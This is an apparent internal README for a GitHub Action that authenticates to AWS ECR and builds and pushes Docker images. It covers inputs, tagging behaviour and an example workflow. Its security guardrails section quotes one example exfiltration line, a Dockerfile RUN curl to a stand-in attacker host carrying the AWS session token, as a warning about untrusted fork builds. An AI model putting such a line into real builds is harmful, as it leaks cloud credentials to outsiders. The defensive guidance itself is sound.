# docker-build-push

Full ECR auth + Docker metadata + build + push, in one step.

## What it does

Replaces the 5-step boilerplate (`configure-aws-credentials` → `amazon-ecr-login` → `docker/metadata-action` → `setup-docker-builder` → `build-push-action`) that used to be copy-pasted across every `build-docker-*.yml` workflow in `ai-engine` (15 of them at last count). Internally calls [`setup-ecr`](../setup-ecr/README.md), so a caller using this action does **not** need a separate `setup-ecr` step.

## How it works

| Step | Action | What happens |
|---|---|---|
| 1. Setup ECR | `hakimo-ai/actions/setup-ecr@v1` | AWS credentials + ECR login (see [setup-ecr](../setup-ecr/README.md) for the full breakdown). |
| 2. Extract Docker metadata | `docker/metadata-action` | Computes the image tag(s). If `tag` is set explicitly, that's used. Otherwise: `master-{SHA}` on the `master` branch, `dev-{SHA}` on any other branch. If `latest-on-master` is `true` (the default) and no explicit `tag` was given, a `latest` tag is added on `master`. |
| 3. Set up Docker Buildx | `useblacksmith/setup-docker-builder` | Provisions a Blacksmith-hosted Buildx builder (faster shared build cache than the default GitHub-hosted one). |
| 4. Build & Push | `useblacksmith/build-push-action` | Builds `dockerfile` in `context` and pushes every tag computed in step 2 to `ecr-registry`/`ecr-repo`. |

## Inputs

| Input | Required | Default | Description |
|-------|----------|---------|-------------|
| `role-to-assume` | yes | — | IAM role ARN |
| `aws-region` | yes | — | AWS region |
| `ecr-registry` | yes | — | ECR registry URL |
| `ecr-repo` | yes | — | ECR repository name (e.g. `company-vision/alarm-group-etl`) |
| `dockerfile` | no | `Dockerfile` | Path to Dockerfile |
| `context` | no | `.` | Docker build context |
| `tag` | no | `''` | Explicit tag (e.g. `base-latest`). When empty: `master-{SHA}` on master, `dev-{SHA}` on branches |
| `latest-on-master` | no | `true` | Also push a `latest` tag on master when no explicit tag is set. Set to `false` for images that use their own fixed tag (e.g. `base-latest`) |

## Outputs

| Output | Description |
|--------|-------------|
| `tags` | Newline-separated list of all pushed image tags |

## Example

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262  # v4.4.0

  - id: build
    uses: hakimo-ai/actions/docker-build-push@v1
    with:
      role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
      aws-region: ${{ vars.AWS_REGION }}
      ecr-registry: ${{ secrets.ECR_REGISTRY }}
      ecr-repo: company-vision/alarm-group-etl
      dockerfile: ./Dockerfile.alarmgroups.etl
      tag: ${{ inputs.tag }}

  - run: echo "Pushed ${{ steps.build.outputs.tags }}"
```

## Security guardrails

This is the highest-blast-radius action in this repo: it authenticates to AWS, **builds and executes a Dockerfile you supply**, and pushes the resulting image to a real registry.

- **Building a Dockerfile means running its instructions.** `RUN` steps execute arbitrary commands with network access during the build, inside the AWS session `setup-ecr` just created for this job. If `dockerfile`/`context` ever point at code from an untrusted source (a fork PR, an unreviewed branch), a malicious `RUN curl https://attacker.example/$AWS_SESSION_TOKEN` (or similar) can exfiltrate the assumed role's temporary credentials, or the build itself can be tampered with to produce a different image than what the source appears to describe.
- **Never wire this action to a workflow trigger that builds untrusted fork PR content without a human approval gate.** Don't use `pull_request_target` combined with checking out a fork's PR head in the same job — see the [pwn request](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) writeup linked from `setup-ecr`'s README. If you need CI to validate a fork PR's Dockerfile, build it (in a sandboxed/no-credentials job) without pushing, and gate the actual `docker-build-push` call behind review.
- **The default tag is deterministic, not content-addressed.** `master-{SHA}`/`dev-{SHA}` means re-running this action for the same commit overwrites the same tag with whatever the working tree looks like at run time — not necessarily bit-identical to a previous run if base images or build args changed. If you need a tag that's guaranteed immutable, pin `tag` explicitly and treat that tag as append-only in your own process.
- **`ecr-repo`/`ecr-registry` typos push to the wrong place, not an error.** Docker will happily push a `alarm-group-etl` image to a repo named `alaram-group-etl` if that's what you typed, silently creating it if your IAM role allows repo creation. Double-check these values in review, especially for copy-pasted workflow files.
